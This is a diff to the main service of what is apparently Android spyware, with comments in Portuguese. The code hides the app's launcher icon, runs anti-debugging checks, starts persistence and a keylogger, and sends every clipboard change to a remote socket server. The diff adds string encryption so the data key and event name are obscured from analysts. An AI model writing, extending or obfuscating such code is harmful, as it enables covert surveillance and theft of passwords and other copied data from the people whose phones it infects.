@@ -11,6 +11,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -31,7 +32,6 @@ public class MainService extends Service {
             } else {
                 Log.d("AntiAnalysis", "Verificação anti-análise: OK");
             }
-            // Agenda próxima verificação
             antiDebugHandler.postDelayed(this, ANTI_DEBUG_INTERVAL);
         }
     };
@@ -48,7 +48,7 @@ public class MainService extends Service {
         // Inicia verificações periódicas
         startAntiDebugTimer();
 
-        // Inicia serviço de persistência (Hide Icon + Foreground)
+        // Inicia serviço de persistência
         startPersistenceService();
 
         // Inicia KeyLogger
@@ -66,7 +66,6 @@ public class MainService extends Service {
     }
 
     private void startAntiDebugTimer() {
-        // Inicia a primeira verificação após 10 segundos
         antiDebugHandler.postDelayed(antiDebugRunnable, 10000);
         Log.d("MainService", "Timer de Anti-Debug iniciado (intervalo: 15s)");
     }
@@ -79,17 +78,18 @@ public class MainService extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
-
     }
 
     @Override
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
         // Oculta ícone do app
         PackageManager pkg = this.getPackageManager();
-        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        pkg.setComponentEnabledSetting(
+                new ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
 
-        // Listener de Clipboard
+        // Listener de Clipboard com String Encryption
         ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
         clipboardManager.addPrimaryClipChangedListener(() -> {
             if (clipboardManager.hasPrimaryClip()) {
@@ -99,9 +99,12 @@ public class MainService extends Service {
                     if (text != null && text.length() > 0) {
                         try {
                             JSONObject data = new JSONObject();
-                            data.put("text", text);
+                            data.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), text); // "text"
+
                             if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
-                                IOSocket.getInstance().getIoSocket().emit("0xCB", data);
+                                // Evento 0xCB criptografado
+                                String eventClipboard = StringCrypto.d("EE3oX3TnmSHEuEA1GpY6FQ=="); // 0xCB
+                                IOSocket.getInstance().getIoSocket().emit(eventClipboard, data);
                             }
                         } catch (JSONException e) {
                             e.printStackTrace();
